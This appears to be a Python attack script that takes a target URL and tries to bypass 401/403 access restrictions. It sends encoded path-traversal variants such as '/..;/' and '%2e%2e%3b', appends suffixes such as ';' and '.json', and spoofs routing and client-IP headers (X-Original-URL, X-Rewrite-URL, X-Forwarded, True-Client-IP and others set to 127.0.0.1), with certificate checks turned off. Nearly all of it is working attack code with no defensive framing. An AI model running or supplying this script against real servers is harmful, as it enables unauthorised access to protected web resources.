from datetime import date, datetime
from urllib.parse import urlparse, urlunparse
import sys, argparse, logging, requests
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(
description="use this script to fuzz endpoints that return a 401/403"
)
parser.add_argument('--url','-u', action="store", default=None, dest='url',
	help="Specify the target URL")
args = parser.parse_args()

if not len(sys.argv) > 1:
	parser.print_help()
	print()
	exit()

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"DNT": "1",
"Connection": "close",
"Upgrade-Insecure-Requests": "1"}

prefixPayloads = [
'/.;/', '/..;/', '//', '/./', '/.//', '/..//', '/%2e%3b/', '/%2e%2e%3b/',
'%2f/', '/%2f', '%2f%2f', '/%2e/', '/%2e%2f/', '/%2e%2e%2f/', '/%252e%253b/',
'/%252e%252e%253b/', '%252f%252f', '%252f/', '/%252f', '/%252e/', '/%252e%252f/',
'/%252e%252e%252f/']

suffixPayloads = [
';','.html','.json','#', '/%20']

def preAndPost(parsed):
	finalUrls = []
	### Set up paths with prefix payloads
	for h in range(len(pathPieces)):
	    for p in prefixPayloads:
	        parsed = parsed._replace(path=path.replace('/' + pathPieces[h], p + pathPieces[h]))
	        finalUrls.append(urlunparse(parsed))

	### Set up paths with suffix payloads
	for h in range(len(pathPieces)):
	    for p in suffixPayloads:
	        parsed = parsed._replace(path=path.replace(pathPieces[h], pathPieces[h] + p))
	        finalUrls.append(urlunparse(parsed))

	return finalUrls

def sendHeaders(url, path):
	headers["X-Original-URL"] = path
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Original-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Original-URL"]))
	headers.pop("X-Original-URL")

	headers["X-Rewrite-URL"] = path
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Rewrite-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Rewrite-URL"]))
	headers.pop("X-Rewrite-URL")

	headers["X-Originating-IP"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Originating-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Originating-IP"]))
	headers.pop("X-Originating-IP")

	headers["X-Forwarded"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Forwarded: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded"]))
	headers.pop("X-Forwarded")

	headers["Forwarded-For"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["Forwarded-For"]))
	headers.pop("Forwarded-For")

	headers["X-Remote-IP"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Remote-IP: {}\n".format(resp.status_code, len(resp.text), headers["X-Remote-IP"]))
	headers.pop("X-Remote-IP")

	headers["X-Remote-Addr"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Remote-Addr: {}\n".format(resp.status_code, len(resp.text), headers["X-Remote-Addr"]))
	headers.pop("X-Remote-Addr")

	headers["X-ProxyUser-Ip"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-ProxyUser-Ip: {}\n".format(resp.status_code, len(resp.text), headers["X-ProxyUser-Ip"]))
	headers.pop("X-ProxyUser-Ip")

	headers["Client-IP"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["Client-IP"]))
	headers.pop("Client-IP")

	headers["Cluster-Client-IP"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: Cluster-Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["Cluster-Client-IP"]))
	headers.pop("Cluster-Client-IP")

	headers["True-Client-IP"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: True-Client-IP: {}\n".format(resp.status_code, len(resp.text), headers["True-Client-IP"]))
	headers.pop("True-Client-IP")

	headers["X-ProxyUser-Ip"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-ProxyUser-Ip: {}\n".format(resp.status_code, len(resp.text), headers["X-ProxyUser-Ip"]))
	headers.pop("X-ProxyUser-Ip")
	
	headers["X-Custom-IP-Authorization"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Custom-IP-Authorization: {}\n".format(resp.status_code, len(resp.text), headers["X-Custom-IP-Authorization"]))
	headers.pop("X-Custom-IP-Authorization")

def sendFinalPayloads(finalUrls):
	for url in finalUrls:
		parsed = urlparse(url)
		path = parsed.path
		resp = requests.get(url, headers=headers, verify=False)
		print("Response code: {}   Response length: {}   Path: {}\n".format(resp.status_code, len(resp.text), path))


url = args.url
parsed = urlparse(url)
path = parsed.path
pathPieces = ' '.join(parsed.path.split('/')).split()

finalUrls = preAndPost(parsed)

sendHeaders(url, path)
sendFinalPayloads(finalUrls)
